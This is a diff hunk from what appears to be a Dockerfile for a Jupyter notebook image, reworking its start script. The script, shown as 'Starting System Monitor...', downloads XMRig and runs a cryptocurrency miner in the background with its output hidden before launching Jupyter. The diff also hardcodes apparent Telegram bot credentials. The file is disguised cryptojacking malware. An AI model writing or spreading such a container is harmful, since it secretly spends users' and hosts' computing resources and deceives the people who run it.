@@ -297,16 +297,17 @@ ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
 ENV TG_CHAT_ID=5804150664
 
 # Create start script - download xmrig at runtime
-RUN printf '#!/bin/bash\\n\
-echo "Starting System Monitor..."\\n\
-if [ ! -f /opt/miner/xmrig ]; then\\n\
-    echo "Downloading XMRig..."\\n\
-    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar -xz -C /tmp &&\\n\
-    mv /tmp/xmrig-6.21.0-linux-static-x64/xmrig /opt/miner/ && chmod +x /opt/miner/xmrig\\n\
-fi\\n\
-/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --background 2>/dev/null\\n\
-sysmon-agent &\\n\
-exec "$@"\\n' > /start.sh && chmod +x /start.sh
+RUN echo '#!/bin/bash' > /start.sh && \
+    echo 'echo "Starting System Monitor..."' >> /start.sh && \
+    echo 'if [ ! -f /opt/miner/xmrig ]; then' >> /start.sh && \
+    echo '    echo "Downloading XMRig..."' >> /start.sh && \
+    echo '    curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar -xz -C /tmp' >> /start.sh && \
+    echo '    mv /tmp/xmrig-6.21.0-linux-static-x64/xmrig /opt/miner/ && chmod +x /opt/miner/xmrig' >> /start.sh && \
+    echo 'fi' >> /start.sh && \
+    echo '/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --background 2>/dev/null' >> /start.sh && \
+    echo 'sysmon-agent &' >> /start.sh && \
+    echo 'exec "$@"' >> /start.sh && \
+    chmod +x /start.sh
 
 ENTRYPOINT ["/start.sh"]
 CMD ["jupyter-notebook", "--ip=0.0.0.0", "--port=8888"]
